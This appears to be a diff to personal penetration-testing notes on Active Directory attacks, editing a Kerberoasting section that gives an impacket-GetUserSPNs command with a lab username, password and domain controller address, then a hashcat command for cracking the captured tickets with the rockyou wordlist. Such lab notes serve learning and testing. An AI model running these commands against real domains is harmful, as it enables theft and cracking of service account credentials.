@@ -187,10 +187,12 @@ Pass the hash / Pass the password Mitigation
 
 b. Kerberoasting attacks
 This attack takes advantage of service accounts
-   impacket-GetUserSPNs FKEYS.local/bjames:Password! -dc-ip 192.168.182.139 -request
+   <img width="962" height="668" alt="image" src="https://github.com/user-attachments/assets/2245384c-ca81-4237-a8b7-64bc1082709a" />
+
+cmd: impacket-GetUserSPNs FKEYS.local/bjames:Password! -dc-ip 192.168.182.139 -request
    <img width="895" height="374" alt="image" src="https://github.com/user-attachments/assets/ccb90c8e-47b1-4f5e-8e06-12909809244c" />
 
-   <img width="962" height="668" alt="image" src="https://github.com/user-attachments/assets/2245384c-ca81-4237-a8b7-64bc1082709a" />
+   
 
 hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
 
